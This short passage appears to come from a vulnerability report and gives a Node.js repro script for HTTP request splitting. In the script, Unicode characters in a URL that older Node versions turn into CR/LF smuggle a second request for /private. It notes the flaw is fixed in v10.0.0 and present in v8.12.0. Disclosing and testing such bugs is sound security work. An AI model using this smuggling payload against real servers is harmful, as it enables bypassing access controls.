You can confirm it with the following repro script:\n\n  \n```\nconst http = require('http')\n\nconst server = http.createServer((req, res) =\u003e {\n  console.log(req.url);\n  res.end();\n});\n\nserver.listen(8000, function() {\n  http.get('http://127.0.0.1:8000/?param=x\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:{\\u0120}127.0.0.1:8000\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/private', function() {\n  });\n});\n```\n\nThe vulnerability seems to be fixed in v10.0.0 but still present in v8.12.0.
